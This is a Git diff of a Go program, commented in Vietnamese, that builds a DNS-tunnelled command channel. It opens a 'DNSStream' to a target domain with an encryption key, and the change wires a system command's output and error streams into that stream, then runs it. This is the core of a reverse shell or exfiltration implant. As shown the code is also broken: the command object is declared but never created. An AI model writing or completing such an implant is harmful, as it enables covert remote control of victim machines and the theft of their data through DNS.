@@ -1,9 +1,8 @@
 package main
 
 import (
-	"bufio"
-	"fmt"
 	"ipwf/lib/transport"
+	"os/exec"
 )
 
 // khởi tạo 2 mảng chứa tên miền và encryptionKey
@@ -14,7 +13,7 @@ var (
 
 func main() {
 	// khởi tạo cmd bằng exec.Cmd của hệ thống
-	// var cmd *exec.Cmd
+	var cmd *exec.Cmd
 
 	// // kiểm tra nếu bằng window thì sử dụng cmd.exe
 	// if runtime.GOOS == "windows" {
@@ -28,32 +27,33 @@ func main() {
 	dnsTransport := transport.DNSStream(targetDomain, encryptionKey)
 
 	// // gán cho cmd.Stdout bằng dữ liệu của dnsTransport
-	// cmd.Stdout = dnsTransport
+	cmd.Stdout = dnsTransport
 
 	// // gán cho cmd.Stderr bằng dữ liệu của dnsTransport
-	// cmd.Stderr = dnsTransport
+	cmd.Stderr = dnsTransport
 
 	// // gán cho cmd.Stdin bằng dữ liệu của dnsTransport
 	// cmd.Stdin = dnsTransport
 
-	scanner := bufio.NewScanner(dnsTransport)
-	for scanner.Scan() {
-		fmt.Println(scanner.Text())
-	}
+	// scanner := bufio.NewScanner(dnsTransport)
+	// // scanner.Text() = dnsTransport
+	// for scanner.Scan() {
+	// 	fmt.Println(scanner.Text())
+	// }
 
-	if scanner.Err() != nil {
-		// Handle error.
-		fmt.Println(scanner.Err())
+	// if scanner.Err() != nil {
+	// 	// Handle error.
+	// 	fmt.Println(scanner.Err())
 
-	}
+	// }
 
 	// // hiển thị dnsTransport để kiểm xoát thêm
 
 	// //	khởi tạo err bằng cách chạy cmd.Run()
-	// err := cmd.Run()
+	err := cmd.Run()
 
 	// // nếu có lỗi sẽ trả về
-	// if err != nil {
-	// 	return
-	// }
+	if err != nil {
+		return
+	}
 }
